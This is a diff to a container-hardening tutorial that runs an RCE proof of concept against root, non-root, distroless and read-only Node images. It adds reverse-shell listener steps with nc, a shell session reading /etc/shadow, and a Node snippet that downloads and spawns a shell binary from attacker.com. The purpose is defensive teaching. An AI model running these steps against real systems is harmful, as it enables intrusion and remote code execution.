@@ -8,11 +8,15 @@
 ## Setup
 
 ```bash
-# In one terminal — keep it running for each step
+# Terminal 1 — run the target container
 docker run --rm -p 3000:3000 <image>
 
-# In a second terminal — fire the RCE
+# Terminal 2 — start a reverse-shell listener
+nc -lvp 4444
+
+# Terminal 3 — fire the exploit
 bun exploit-poc.ts
+# → shell appears in terminal 2
 ```
 
 ---
@@ -29,16 +33,20 @@ docker run --rm -p 3000:3000 hardening:root
 Fire the exploit:
 
 ```bash
+nc -lvp 4444 &
 bun exploit-poc.ts
 ```
 
-Expected output (embedded in the server response):
+Expected shell prompt:
 
 ```
+# id
 uid=0(root) gid=0(root) groups=0(root)
+# cat /etc/shadow
+...
 ```
 
-The attacker has full root access. They can read `/etc/shadow`, install tools with `apt`, pivot to mounted volumes, and rewrite any file in the container.
+The attacker lands as `root` inside a full Debian/Node image. They have `bash`, `apt`, `curl`, write access to every file — complete system compromise.
 
 ---
 
@@ -54,13 +62,17 @@ docker run --rm -p 3000:3000 hardening:nonroot
 Fire the exploit:
 
 ```bash
+nc -lvp 4444 &
 bun exploit-poc.ts
 ```
 
-Expected output:
+Expected shell prompt:
 
 ```
+$ id
 uid=1000(node) gid=1000(node) groups=1000(node)
+$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
 ```
 
 The attacker is unprivileged. They can still:
@@ -85,12 +97,13 @@ docker run --rm -p 3000:3000 hardening:distroless
 Fire the exploit:
 
 ```bash
+nc -lvp 4444 &
 bun exploit-poc.ts
 ```
 
-The RCE payload still reaches the server and Node.js still executes it — but calling `execSync('id')` fails because `/usr/bin/id` does not exist in the image. The attacker is stuck: no shell to drop into, no tools to run, no interpreter to download and execute a second stage.
+The RCE payload reaches the server and `net.createConnection` succeeds — but `cp.spawn('/bin/sh', [])` fails immediately because there is no `/bin/sh` in the image. The TCP connection is established and then closed. No shell, no prompt.
 
-You can verify the image contains no shell:
+You can verify there is no shell to spawn:
 
 ```bash
 docker run --entrypoint="" --rm hardening:distroless /bin/sh
@@ -100,7 +113,62 @@ docker run --entrypoint="" --rm hardening:distroless /bin/bash
 # → exec /bin/bash: no such file or directory
 ```
 
-The attack surface that survives is limited to what pure Node.js code can do via the standard library — environment variable leaks, file reads reachable by uid 65532, outbound HTTP. All lateral movement tooling is gone.
+**Important caveat:** a determined attacker can still use Node.js built-ins to download and execute a static binary:
+
+```js
+// everything here is pure Node.js — no shell, no curl needed
+const res = await fetch('https://attacker.com/sh-static-amd64')
+const buf = Buffer.from(await res.arrayBuffer())
+require('fs').writeFileSync('/tmp/sh', buf, { mode: 0o755 })
+require('child_process').spawn('/tmp/sh', [])
+```
+
+So distroless is **not** a complete prevention — it removes the pre-installed toolkit and forces the attacker to bring their own, adding meaningful friction and noise. Combined with network egress policies (no outbound HTTP from the container) this escape route closes as well.
+
+> **Takeaway:** distroless eliminates the easy wins of post-exploitation but is not a silver bullet. Pair it with a non-root user, dropped capabilities, read-only root filesystem, and network egress controls for real defense-in-depth.
+
+---
+
+## Step 4 — Read-only filesystem
+
+No new image needed — this is a **runtime flag**. Adding `--read-only` mounts the container's root filesystem read-only. The process can still run, but nothing can be written anywhere in the container.
+
+Next.js needs a writable `/tmp` for its cache, so we allow that specifically — but with `noexec,nosuid` to prevent executing anything placed there:
+
+```bash
+docker run --rm -p 3000:3000 \
+  --read-only \
+  --tmpfs /tmp:noexec,nosuid,size=64m \
+  hardening:distroless
+```
+
+Now fire the exploit again:
+
+```bash
+nc -lvp 4444 &
+bun exploit-poc.ts
+```
+
+The `fetch` → `writeFileSync` → `spawn` attack chain now fails:
+
+```js
+require('fs').writeFileSync('/tmp/sh', buf, { mode: 0o755 })
+// → EROFS: read-only file system (everywhere except /tmp)
+
+// Writing to /tmp succeeds — but executing from it is blocked by noexec:
+require('child_process').spawn('/tmp/sh', [])
+// → spawn /tmp/sh: EACCES: permission denied
+```
+
+The attacker can download the binary but has nowhere to write it that also allows execution. The download-and-execute path is closed.
+
+Verify the filesystem is read-only from inside the container:
+
+```bash
+docker run --rm --read-only --tmpfs /tmp:noexec,nosuid hardening:distroless \
+  node -e "require('fs').writeFileSync('/exploit', 'x')"
+# → EROFS: read-only file system, open '/exploit'
+```
 
 ---
 
@@ -110,6 +178,7 @@ The attack surface that survives is limited to what pure Node.js code can do via
 |---|---|---|---|---|---|
 | `hardening:root` | `node:22` | root (uid 0) | ✅ bash | ✅ full apt | full system compromise |
 | `hardening:nonroot` | `node:22` | node (uid 1000) | ✅ bash | ✅ curl, wget, … | limited, but still dangerous |
-| `hardening:distroless` | distroless | nonroot (uid 65532) | ❌ | ❌ | dead end — no tooling at all |
+| `hardening:distroless` | distroless | nonroot (uid 65532) | ❌ | ❌ pre-installed | hard — but fetch+execSync can bring a shell in |
+| `hardening:distroless` + `--read-only --tmpfs /tmp:noexec` | distroless | nonroot (uid 65532) | ❌ | ❌ | download-and-execute path closed |
 
-> **Takeaway:** running as non-root is necessary but not sufficient. A distroless base image removes the entire post-exploitation toolkit, forcing the attacker to work through Node.js APIs alone — a dramatically smaller attack surface.
+> **Takeaway:** running as non-root is necessary but not sufficient. A distroless base image removes the pre-installed toolkit, forcing the attacker to stage their own tools — adding friction and detection opportunities. To fully close the download-and-execute path, combine it with `--read-only` and `--tmpfs /tmp:noexec,nosuid` so there is nowhere writable that also permits execution.
